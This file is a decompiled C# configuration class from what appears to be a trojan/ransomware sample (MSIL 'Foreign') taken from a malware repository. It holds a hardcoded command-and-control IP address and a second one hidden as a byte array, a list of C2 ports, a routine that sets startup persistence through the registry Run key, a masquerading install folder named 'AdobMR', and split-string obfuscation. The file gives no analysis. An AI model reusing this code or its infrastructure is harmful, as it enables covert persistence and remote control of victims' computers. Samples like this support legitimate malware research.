// Decompiled with JetBrains decompiler
// Type: ravighruam.ravighruamCONF
// Assembly: ravighruam, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74F3FC03-D32B-42A6-BF5E-9A04C10FC1EF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-3a2d8137283ea060941c3dcbaf2f82ab42ec93af7866b1de1b42f59df23d6f6e.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace ravighruam
{
  internal static class ravighruamCONF
  {
    public static string ravighruampc_id = "iterwa|ravighruam".Split('|')[0];
    public static string ravighruamremvUser = "dihwnkre|ravighruam".Split('|')[0];
    public static string ravighruamfilesLogs = "idmhsldh".Split('|')[0];
    public static string ravighruamAppPath = "";
    public static string ravighruamdefaultP = "202.225.21.20|ravighruam".Split('|')[0];
    public static string ravighruammainApp = "ravighruam|ravighruam".Split('|')[0];
    public static int[] ports = new int[5]
    {
      3364,
      8264,
      10262,
      14626,
      16564
    };
    public static int ravighruamport;
    public static byte[] ravighruamvpsips = new byte[15]
    {
      (byte) 49,
      (byte) 55,
      (byte) 51,
      (byte) 46,
      (byte) 50,
      (byte) 49,
      (byte) 50,
      (byte) 46,
      (byte) 49,
      (byte) 57,
      (byte) 50,
      (byte) 46,
      (byte) 50,
      (byte) 50,
      (byte) 57
    };
    public static string ravighruamappPath = "\\AdobMR\\|ravighruam".Split('|')[0];

    public static byte[] getByteArray(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static string ravighruamOsname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!ravighruam".Split('!')[0];
      }
    }

    public static void ravighruamset_run(string app, string path)
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|ravighruam".Split('|')[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        object obj = registryKey.GetValue(ravighruamCONF.ravighruampc_id + app);
        if (obj == null)
        {
          registryKey.SetValue(ravighruamCONF.ravighruampc_id + app, (object) path);
        }
        else
        {
          if (!(obj.ToString() != path))
            return;
          registryKey.SetValue(ravighruamCONF.ravighruampc_id + app, (object) path);
        }
      }
      catch
      {
      }
    }

    public static string ravighruamget_mpath()
    {
      if (ravighruamCONF.ravighruamAppPath != "")
        return ravighruamCONF.ravighruamAppPath;
      ravighruamCONF.ravighruamAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + ravighruamCONF.ravighruamappPath;
      try
      {
        if (!Directory.Exists(ravighruamCONF.ravighruamAppPath))
          Directory.CreateDirectory(ravighruamCONF.ravighruamAppPath);
        if (Directory.Exists(ravighruamCONF.ravighruamAppPath))
          return ravighruamCONF.ravighruamAppPath;
      }
      catch
      {
      }
      ravighruamCONF.ravighruamAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + ravighruamCONF.ravighruamappPath;
      try
      {
        if (!Directory.Exists(ravighruamCONF.ravighruamAppPath))
          Directory.CreateDirectory(ravighruamCONF.ravighruamAppPath);
        if (!Directory.Exists(ravighruamCONF.ravighruamAppPath))
          return ravighruamCONF.ravighruamAppPath;
      }
      catch
      {
      }
      ravighruamCONF.ravighruamAppPath = Application.ExecutablePath;
      return ravighruamCONF.ravighruamAppPath;
    }
  }
}
